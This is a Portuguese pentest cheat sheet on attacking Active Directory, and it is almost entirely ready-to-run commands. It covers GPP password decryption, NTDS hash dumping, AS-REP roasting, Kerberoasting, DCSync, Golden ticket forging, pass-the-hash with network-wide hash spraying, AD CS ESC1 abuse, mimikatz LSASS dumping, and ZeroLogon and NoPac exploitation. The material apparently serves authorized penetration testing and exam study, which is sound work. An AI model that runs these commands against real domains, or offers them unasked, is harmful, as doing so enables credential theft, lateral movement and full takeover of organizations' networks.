
# 9. Active Directory

### 9.1 GPP mal configurado (SYSVOL)
```cmd
net use z: \\<target_hostname>\SYSVOL
dir /s Groups.xml
```
```bash
gpp-decrypt <cpassword>
```

### 9.2 Dump de hashes do DC
```bash
# secretsdump a partir de NTDS.dit + hive SYSTEM:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile ntlm_hashes
# msf: post/windows/gather/credentials/domain_hashdump  |  psexec_ntdsgrab
```

### 9.3 Enum LDAP → ver [[03 - Enumeração de Serviços por Porta#LDAP — 389]]

### 9.4 BloodHound (mapear caminhos de ataque)
```bash
# Coletor remoto (Linux):
bloodhound-python -u user -p 'SENHA' -d dominio.local -ns $IP -c All --zip
# Coletor no host Windows: SharpHound.exe -c All  |  Invoke-BloodHound -CollectionMethod All
# nxc também coleta: nxc ldap $IP -u user -p 'SENHA' --bloodhound -c All --dns-server $IP
# Importar o .zip na GUI (bloodhound) e buscar: "Shortest Path to Domain Admins".
```

### 9.5 AS-REP Roasting (usuários sem preauth Kerberos)
```bash
# Sem credenciais, com lista de usuários:
impacket-GetNPUsers dominio.local/ -dc-ip $IP -no-pass -usersfile users.txt
# Com credenciais, enumera toda a árvore:
impacket-GetNPUsers dominio.local/user:'SENHA' -dc-ip $IP -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### 9.6 Kerberoasting (SPNs → hash de service account)
```bash
impacket-GetUserSPNs dominio.local/user:'SENHA' -dc-ip $IP -request -outputfile kerb.txt
# nxc: nxc ldap $IP -u user -p 'SENHA' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

### 9.7 DCSync (replicar hashes do domínio)
```bash
# Precisa de privilégios de replicação (DA / conta com DS-Replication-Get-Changes):
impacket-secretsdump -just-dc dominio.local/user:'SENHA'@$IP
impacket-secretsdump -just-dc-user krbtgt dominio.local/user:'SENHA'@$IP   # só o krbtgt
# mimikatz: lsadump::dcsync /domain:dominio.local /user:Administrador
```

### 9.8 Golden / Silver Ticket
```bash
# Golden precisa do hash NTLM do krbtgt + Domain SID (nxc ... --get-sid ou whoami /user):
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain dominio.local Administrador
export KRB5CCNAME=Administrador.ccache
impacket-psexec dominio.local/Administrador@dc.dominio.local -k -no-pass
```

### 9.9 Pass-the-Hash / Pass-the-Ticket (movimento lateral)
```bash
impacket-psexec  dominio.local/Administrador@$IP -hashes :<NThash>
impacket-wmiexec dominio.local/Administrador@$IP -hashes :<NThash>   # mais furtivo (sem serviço)
evil-winrm -i $IP -u Administrador -H <NThash>
nxc smb 192.168.1.0/24 -u Administrador -H <NThash>                 # spray do hash na rede
```

### 9.10 AD CS — Certipy (ESC1 e afins)
```bash
certipy find -u user@dominio.local -p 'SENHA' -dc-ip $IP -vulnerable -stdout
# ESC1: template permite SAN arbitrário → pedir cert como Administrador:
certipy req -u user@dominio.local -p 'SENHA' -ca <CA> -template <Template> -upn Administrador@dominio.local
certipy auth -pfx administrador.pfx -dc-ip $IP        # devolve o hash NT
evil-winrm -i $IP -u Administrador -H <NThash>
```

### 9.11 Mimikatz (no host, credenciais em memória)
```text
privilege::debug
sekurlsa::logonpasswords          :: NTLM / senhas em claro na LSASS
sekurlsa::pth /user:Administrador /domain:dominio.local /ntlm:<NThash>
lsadump::sam                      :: hashes locais  |  lsadump::lsa /patch
kerberos::list /export            :: exportar tickets .kirbi
```

### 9.12 CVEs de AD (checar sempre)
```bash
# ZeroLogon (CVE-2020-1472) — reseta a senha da conta de máquina do DC:
python3 zerologon_tester.py DC01 $IP        # só testa (não altera)
nxc smb $IP -M zerologon
# NoPac (CVE-2021-42287/42278):
python3 noPac.py dominio.local/user:'SENHA' -dc-ip $IP -shell --impersonate Administrador
# PetitPotam / PrintNightmare → relay para AD CS quando aplicável.
```
